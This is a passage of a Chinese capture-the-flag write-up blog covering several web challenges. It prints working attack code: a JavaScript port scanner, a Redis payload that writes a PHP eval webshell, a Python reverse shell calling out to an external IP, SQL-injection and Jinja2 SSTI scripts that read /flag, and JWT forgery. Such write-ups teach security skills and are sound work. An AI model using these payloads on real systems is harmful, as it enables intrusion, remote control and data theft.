class="string">'resourceRequestUrls'</span>)</span><br><span class="line">        <span class="keyword">return</span> links</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = request.files[<span class="string">'file'</span>]</span><br><span class="line">        filename = str(uuid.uuid1()) + <span class="string">'.html'</span></span><br><span class="line">        basepath = os.path.dirname(__file__)</span><br><span class="line">        upload_path = os.path.join(basepath, <span class="string">'static/upload/'</span>, filename)</span><br><span class="line">        content = f.read()</span><br><span class="line">        <span class="comment">#hint</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'level=low_273eac1c'</span> <span class="keyword">not</span> <span class="keyword">in</span> content <span class="keyword">and</span> <span class="string">'dbfilename'</span> <span class="keyword">in</span> content.lower():</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, msg=<span class="string">u'Warning: 发现恶意关键字'</span>)</span><br><span class="line">        <span class="comment">#hint</span></span><br><span class="line">        <span class="keyword">with</span> open(upload_path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        url = <span class="string">'http://127.0.0.1:80/upload/'</span>+filename</span><br><span class="line">        links = casperjs_html(url)</span><br><span class="line">        links = <span class="string">'\n'</span>.join(links)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> links:</span><br><span class="line">            links = <span class="string">'NULL'</span></span><br><span class="line">        links = <span class="string">'URL: '</span>+url+<span class="string">'\n'</span>+links</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, links=links)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/get_sourcecode', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        <span class="keyword">if</span> ip != <span class="string">'127.0.0.1'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'NOT 127.0.0.1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> open(os.path.dirname(__file__)+<span class="string">'/run.py'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                code = f.read()</span><br><span class="line">            <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'404'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'500'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(403)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unauthorized</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'403'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+<p>代码的第61行可以看到redis的关键字dbfilename,猜测应该是存在一个redis未授权访问，然后用redis写shell，可以先通过js扫描哪些端口是开放的。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">'result'</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	var data='';</span></span><br><span class="line"><span class="undefined">	var body=document.getElementsByTagName('body')[0];</span></span><br><span class="line"><span class="undefined">	ports=[80,81,88,6379,8000,8080,8088];</span></span><br><span class="line"><span class="undefined">	for (var i in ports)&#123;</span></span><br><span class="line"><span class="undefined">		var script=document.createElement('script');</span></span><br><span class="line"><span class="undefined">		poc="data +='"+ports[i]+" OPEN; ';document.getElementById('result').innerHTML=data;"</span></span><br><span class="line"><span class="undefined">		script.setAttribute('src','http://127.0.0.1:'+ports[i]);</span></span><br><span class="line"><span class="undefined">		script.setAttribute('onload',poc);</span></span><br><span class="line"><span class="undefined">		body.appendChild(script);</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>注意这里用到的技巧，如果src错误，onload是不会执行的，因此只有端口开放，相应的端口才会加到data里面。<br>8000端口开放着，题目给了hint，8000端口有apache服务，这里还是可以通过js去对redis进行操作。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"flag"</span>&gt;</span>pwn<span class="tag">&lt;/ <span class="attr">a</span>&gt;</span></span><br><span class="line">level=low_273eac1c</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var xmlHttp;</span></span><br><span class="line"><span class="undefined">if(window.XMLHttpRequest)&#123;</span></span><br><span class="line"><span class="undefined">    xmlHttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">else&#123;</span></span><br><span class="line"><span class="undefined">    xmlHttp = newActiveXObject("Microsoft.XMLHTTP");</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">var formData = new FormData();</span></span><br><span class="line"><span class="xml">formData.append("0","flushall"+"\n"+"config set dir /var/www/html/"+"\n"+"config set dbfilename shell.php"+"\n"+'set 1 "\\n\\n<span class="php"><span class="meta">&lt;?php</span> header(\<span class="string">'Access-Control-Allow-Origin:*\');eval($_GET[_]);?&gt;</span></span>\\n\\n"'+"\n"+"save"+"\n"+"quit");</span></span><br><span class="line"><span class="undefined">xmlHttp.open("POST","http://127.0.0.1:6379",true);</span></span><br><span class="line"><span class="undefined">xmlHttp.send(formData);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><code>level=low_273eac1c</code>是为了绕过sourcecode中的限制<br>这里用到了JavaScript的FormData对象，它用于将对象编译成键值对，以便用XMLHttpRequest来发送数据，其主要用于发送表单数据，但亦可用于发送带键数据(keyed data)，而独立于表单使用。<br>然后直接反弹shell<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"flag"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function loadXMLDoc()&#123;</span></span><br><span class="line"><span class="undefined">    var xmlhttp;</span></span><br><span class="line"><span class="undefined">    if (window.XMLHttpRequest)&#123;// code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line"><span class="undefined">        xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    else&#123;// code for IE6, IE5</span></span><br><span class="line"><span class="undefined">        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    xmlhttp.onreadystatechange=function()&#123;</span></span><br><span class="line"><span class="undefined">        if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span><br><span class="line"><span class="undefined">        &#123;</span></span><br><span class="line"><span class="undefined">            document.getElementById("flag").innerHTML=xmlhttp.responseText;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    xmlhttp.open("GET","http://127.0.0.1:8000/shell.php?_=`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"123.207.99.17\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`;",true)</span></span><br><span class="line"><span class="undefined">    xmlhttp.send();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">loadXMLDoc();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/22.png" alt="image">弹过来之后直接读flag即可。<br>不反弹shell，直接读flag.php也是可以的，写入文件的要变成<code>echo file_get_contents(&#39;flag.php&#39;)</code>。<br>发现很多地方都是不能用一句话反弹shell的，python反弹是最稳的。这个题当时看了挺久的，很久才看懂题目意思，本来以为要用gopher打redis，然而并不存在</p>
+<h2 id="0x04-comein"><a href="#0x04-comein" class="headerlink" title="0x04 comein"></a>0x04 comein</h2><p>这题进来能直接看到给了后台源码<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/23.png" alt="image"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="number">0</span>);</span><br><span class="line">$uri = $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($uri,<span class="string">"."</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Unkonw URI."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!parse_url($uri,PHP_URL_HOST))&#123;</span><br><span class="line">    $uri = <span class="string">"http://"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>].$_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$host = parse_url($uri,PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span>($host === <span class="string">"c7f.zhuque.com"</span>)&#123;</span><br><span class="line">    setcookie(<span class="string">"AuthFlag"</span>,<span class="string">"flag&#123;*******"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>首先限制了<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>的开头必须是’.’，这里可以利用apache的特性绕过，比如<code>GET .zxcz/..//index.php</code>，apache会先解析到一个不存在的.zxcz目录，然后再<code>../</code>出来，访问到index.php，这样就绕过了开头必须是.的限制，然后到最后还有一个<code>$host===&quot;c7f.zhuque.com&quot;</code>的要求，我们可以构造例如.zxcz@c7f.zhuque.com/..//index.php的payload，单纯的这个payload，是不符合url格式的，parse_url也不会解析出host，所以$uri会变成<code>http://$_SERVER[&#39;REMOTE_ADDR&#39;].zxcz@c7f.zhuque.com/..//index.php</code>，这时候<code>print_r($uri)</code>，内容是这样的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; c7f.zhuque.com</span><br><span class="line">    [user] =&gt; <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.zxcz</span><br><span class="line">    [path] =&gt; /..<span class="comment">//index.php</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//本地测试</span></span><br></pre></td></tr></table></figure></p>
+<p><code>parse_url</code>解析的特性就不在这里赘述了，可以看到，限制host已经被构造成了<code>c7f.zhuque.com</code>，自然也就可以读到flag了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/31.png" alt="image"><br>数据包的头部，除了可以用相对路径，绝对路径也可以使用，这样就可以构造更自由的REQUEST_URI，如果是相对路径，修改REQUEST_URI之后，就访问到别的地方去了。<br>这里我深入地研究了一下apache解析访问路径的特性，我放了一个echo hii 的zzz.php在apache的网站根目录，然后分别构造了以下的请求头，可以参照返回的结果了解一下apache解析路径的特性<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/33.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/34.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/35.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/36.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/37.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/38.png" alt="image">我是真的摸不透..求高人指点</p>
+<h2 id="0x05-i-am-admin"><a href="#0x05-i-am-admin" class="headerlink" title="0x05 i_am_admin"></a>0x05 i_am_admin</h2><p>题目给了一个登录界面<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/24.png" alt="image">首先用它给的test:test用户登进去，发现有一串secret<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/25.png" alt="image">而且可以发现，登录的同时，cookie中多了一个auth字段<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/27.png" alt="image">看格式像是JWT，base64decode一下，果然是<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/28.png" alt="image">，然后构造用test页面给的secret构造新的jwt<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/30.png" alt="image">再替换一下auth，刷新页面就可以拿到flag<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/29.png" alt="image">这题有个启发，像登录这类的一些关键的cookie不能放过，既可以尝试伪造也可以尝试注入甚至可以爆破（下面就有一题），很可能是解题关键</p>
+<h2 id="0x06-gold"><a href="#0x06-gold" class="headerlink" title="0x06 gold"></a>0x06 gold</h2><p>这题进来是一个鼠标控制小人捡金币的游戏<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/42.png" alt="image">提示要达到1000金币才可以过关，单纯手玩不太可能，因为它貌似捡不到的还会扣分，而且游戏本身比较卡。抓包可以发现，每个金币掉下来都会发一个post包，如果post过去的是你当前的金币值<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/40.png" alt="image">尝试了一下直接post 1000过去，发现会弹反作弊的框，然后，直接从0爆破到1001，可以拿到flag。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/41.png" alt="image"></p>
+<h2 id="0x07-phone"><a href="#0x07-phone" class="headerlink" title="0x07 phone"></a>0x07 phone</h2><p>题目描述：find the flag<br>这题给了一个可以注册和登录的网站<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/43.png" alt="image">注册的phone处限制了只能用数字，马上就能想到强网杯的three hit那题。这里返回的是phone跟你相同的数量，可以猜测后台是<code>select count(phone) from table where phone =&#39;phone&#39;</code>可以先用0x7a2720206f72646572206279203123(zzz’  order by 1#)和0x7a2720206f72646572206279203223(z’ order by 2#)测试一下，发现返回的结果符合猜测的语句(只有一列)<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/44.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/45.png" alt="image">，然后，写个脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests,re,binascii,uuid</span><br><span class="line"></span><br><span class="line">reg_url=<span class="string">'http://1c1a13badb9f4f879556bab7a0aac4a5e516bd9a9453477f.game.ichunqiu.com/register.php'</span></span><br><span class="line">que_url=<span class="string">'http://1c1a13badb9f4f879556bab7a0aac4a5e516bd9a9453477f.game.ichunqiu.com/query.php'</span></span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        ses=requests.session()</span><br><span class="line">        query=raw_input(<span class="string">'query&gt;&gt;&gt;&gt;'</span>)</span><br><span class="line">        user=str(uuid.uuid1())[:<span class="number">7</span>]</span><br><span class="line">        query=<span class="string">'0x'</span>+str(binascii.hexlify(query))</span><br><span class="line">        r1=ses.post(url=reg_url,data=&#123;<span class="string">'username'</span>:user,<span class="string">'password'</span>:<span class="string">'a'</span>,<span class="string">'phone'</span>:query,<span class="string">'register'</span>:<span class="string">'Login'</span>&#125;,</span><br><span class="line">            proxies=proxies,timeout=<span class="number">2</span>)</span><br><span class="line">        r2=ses.get(url=que_url,proxies=proxies,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">print</span> r2.content.decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这里要注意一个地方，mysql中，如果select的是<code>count(?)</code>，如果找不到where语句符合的，会返回一个0，不同于普通的select字段。在普通的select字段的情况下，我们可以用类似于<code>z&#39; and 1=2 union select ...</code> 来使得union select之前的语句不返回字段，不影响回显，但是这里不行，在这里<code>union select</code>之前的语句会返回一个0放在第一行，如果这里不注意，就会发现永远都只能注一个0出来。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/46.png" alt="image">所以，这里可以用<code>limit 1,1</code>或者是<code>order by 1 desc</code>来绕过。然后，常规操作拿到flag。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/47.png" alt="image"></p>
+<h2 id="0x08-mmmmy"><a href="#0x08-mmmmy" class="headerlink" title="0x08 mmmmy"></a>0x08 mmmmy</h2><p>题目描述：find the flag.<br>题目给了一个登陆框<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/49.png" alt="image"><br>首先随便输个用户名密码登进去，发现token是用的jwt，而且是python web(根据路由方式合理猜测)<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/50.png" alt="image">然后看到留言处，需要admin才可以留言，所以，jwtcracker爆破secret，伪造admin的token，在这个过程中发现，如果登录的时候用户名是a或者b或者d，都是爆破不出来正确的secret的，具体原因是什么我也不清楚，爆破出来secret是6a423<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/52.png" alt="image">然后拿着伪造好的token以admin身份登录<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/53.png" alt="image">这题有一个比较神奇的地方，一刷新，token就会变回去了，所以，只能在burp那里留言，或者写脚本<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/55.png" alt="image">留言板处是存在SSTI的，先fuzz了一下，发现&#123;&#123;,&#125;&#125;,&#39;,&#34;,&#95;,os,system是被过滤了的,直接就返回一个none<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/56.png" alt="image">除了用{{}}，其实还可以用{%if 1%}gg{%endif%}这样的格式来进行SSTI，会返回一个gg<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/57.png" alt="image">然后，对于诸多关键字被过滤的情况，可以用例如<code>[request.values.a]</code>的方法来获取参数a。首先这里可以用类似{% if [].__class__.__base__.__subclasses__().pop(40)('/flag')[0]=='f'%}zzz{% endif %}的方法来进行盲注<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/61.png" alt="image">盲注脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://4f2b5b1d73dd4db0b83ddd4050510107f9e570a78f104914.game.ichunqiu.com/bbs?a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=/flag&amp;e=&#123;&#125;"</span></span><br><span class="line">Dict=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#125;&#123;-_'</span></span><br><span class="line">cookies=&#123;<span class="string">"token"</span>:<span class="string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.IXEkNe82X4vypUsNeRFbhbXU4KE4winxIhrPiWpOP30"</span>&#125;</span><br><span class="line">proxies=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> Dict:</span><br><span class="line">            ses=requests.session()</span><br><span class="line">            r=ses.post(url=url.format(i),cookies=cookies,headers=headers,data=<span class="string">r'''text=&#123;% if  ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()['''</span>+str(num)+<span class="string">r''']==request.values.e %&#125;zzz&#123;%endif%&#125;'''</span>,proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'zzz'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">                flag+=i</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                num+=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/62.png" alt="image"><br>还可以用jinja2的print方法，直接就能读到flag，不需要盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=&#123;% print ()[request.values.a][request.values.b][request.values.c]()[request.values.d](40)(request.values.e).read() %&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=pop&amp;e=/flag&amp;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/59.png" alt="image">这里比较玄学，post过去的东西后面一定要加个&amp;，不然就会500，get就不会有这种问题。<br>方法当然不止一种<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/58.png" alt="image"></p>
+<h2 id="0x09-comment"><a href="#0x09-comment" class="headerlink" title="0x09 comment"></a>0x09 comment</h2><p>题目描述：find the flag<br>题目给了一个留言板，未登录留言的话会跳转到login.php<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/63.png" alt="image">然后<code>zhangwei/zhangwei666</code>登进去，然后就可以留言<br>然后看有没有源码泄露，发现有.git，githack拉下来，只有一个<code>write_do.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>看上去卵用没有，怀疑没有拉全，控制台有提示<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/64.png" alt="image"><br>然后就要探索新姿势去把完整的源码拉下来，首先很明显我原来用的githack并不好用，这里推荐一个<a href="https://github.com/BugScanTeam/GitHack" target="_blank" rel="noopener">https://github.com/BugScanTeam/GitHack</a> ，拉下来之后进行如下操作<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/69.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/70.png" alt="image">然后就可以看到完整的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span 